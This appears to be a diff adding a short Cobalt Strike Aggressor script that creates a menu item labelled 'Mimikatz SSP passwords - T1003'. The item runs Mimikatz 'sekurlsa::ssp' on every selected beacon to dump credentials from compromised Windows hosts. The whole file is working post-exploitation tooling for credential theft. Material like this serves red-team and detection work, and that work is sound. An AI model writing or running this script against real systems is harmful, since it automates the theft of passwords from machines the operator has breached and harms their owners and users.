@@ -1,0 +1,12 @@
+item "Mimikatz SSP passwords  - T1003"{
+			local('$bid');
+				foreach $bid ($1){
+					ssp($bid);
+				}
+			}
+
+sub ssp{
+
+bmimikatz($1, "sekurlsa::ssp");
+
+}
